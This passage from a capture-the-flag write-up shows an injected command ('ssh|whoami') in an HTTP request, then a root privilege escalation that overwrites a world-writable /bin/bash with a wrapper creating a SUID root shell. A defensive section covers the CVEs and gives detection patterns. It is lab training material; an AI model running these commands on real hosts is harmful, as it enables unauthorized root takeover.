Origin: http://127.0.0.1:7777
Connection: close
Referer: http://127.0.0.1:7777/service-status
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

service=ssh|whoami
```

- 🔍 *The backend executes `systemctl status ssh | whoami` and mirrors the output. It returns `syswatch` (the service user).*
- 🔍 *Outbound network calls are blocked for the `syswatch` user. We inspect local file permissions on system binaries:*

```bash
ls -la /bin/bash
```

```text
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```

- 🔍 *The primary system shell `/bin/bash` is world-writable:*

```text
-rwxrwxrwx
 ↑↑↑↑↑↑↑↑↑
 |||||||||
 ||||||└└└─ others:  r=read w=write x=execute  ← EVERYONE
 |||└└└──── group:   r=read w=write x=execute
 └└└─────── owner:   r=read w=write x=execute
```

> [!IMPORTANT]
> **World-Writable Bash Shell Exploitation Strategy:**
> Since `/opt/syswatch/syswatch.sh` runs as root via `sudo`, it starts with `#!/bin/bash`. If we modify the `/bin/bash` binary, the root script will run our hijacked bash payload, granting immediate root code execution.
> Overwriting `/bin/bash` directly yields a `Text file busy` (ETXTBSY) lock because it is our active shell. We bypass this by dropping into `dash`, terminating active bash instances, and swapping the binary using `dd`.

- 🔍 *Creating a copy of the real bash binary:*

```bash
cp /bin/bash /tmp/bash.bak
```

```bash
cd /tmp
```

```bash
ls
```

```text
bash.bak
```

- 🔍 *Writing our SUID-creator wrapper script as `/tmp/evil_bash`:*

```bash
cat << 'EOF' > evil_bash
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
exec /tmp/bash.bak "$@"
EOF
```

- 🔍 *We spawn a `dash` shell, terminate all active bash shells, and copy our payload onto `/bin/bash`:*

```bash
dash
```

```bash
$ killall -9 bash
```

```bash
$ dd if=/tmp/evil_bash of=/bin/bash
```

```text
0+1 records in
0+1 records out
94 bytes copied, 0.00033013 s, 285 kB/s
```

- 🔍 *Executing the elevated sudo wrapper script to trigger the hijacked shebang:*

```bash
$ sudo /opt/syswatch/syswatch.sh --version
```

```text
1.0.0
```

- 🔍 *Executing our newly created SUID root shell:*

```bash
$ /tmp/rootbash -p
```

```bash
# whoami
```

```text
root
```

- 🔍 *Root access achieved successfully. The flag is located at `/root/root.txt`.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the DevArea system. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Apache CXF XOP XML Injection / LFI (CVE-2022-46364)

> [!WARNING]
> **Vulnerability Profile:**
> The SOAP application is vulnerable to MTOM XOP Include Injection (CVE-2022-46364), enabling unauthenticated LFI by parsing external attachments referenced via custom URIs.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can read sensitive host configurations, harvest service environment credentials (`hoverfly.service`), and list system usernames, bypassing DTD parsing protections.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update Apache CXF to a version immune to CVE-2022-46364.
> - **Remediation:** Configure XML parsers explicitly to disable external entities and MTOM resolution capabilities.
> - **Detection:** Monitor HTTP request streams for XML nodes containing `xop:Include` or `href="file:///"` tags.

---

### 🔴 Hoverfly Middleware Script OS Command Injection (CVE-2025-54123)

> [!WARNING]
> **Vulnerability Profile:**
> Hoverfly v1.11.3 lacks script validation on the `/api/v2/hoverfly/middleware` interface.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Authenticated attackers can inject arbitrary OS code executed directly by the proxy service user (`dev_ryan`), leading to remote command execution.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Apply Hoverfly security patches to block arbitrary middleware execution paths.
> - **Remediation:** Enforce strong authentication policies and run proxy servers under rootless sandboxes.
> - **Detection:** Track and alert on suspicious child processes spawned by proxy engines (`hoverfly` executing shell sessions).

---

### 🔴 World-Writable System Binaries

> [!WARNING]
> **Vulnerability Profile:**
> The primary shell binary `/bin/bash` has insecure permissions set to `777`.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Any local user can overwrite `/bin/bash` to run arbitrary commands under the context of any process invoking a bash shell (such as systemd services or sudo tasks), escalating instantly to root.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Set strict file ownership (`root:root`) and permission sets (`755`) on all binaries within bin pathways.
> - **Remediation:** Deploy File Integrity Monitoring (FIM) tools (such as Samhain or Tripwire) to block and report modifications to system execution paths.
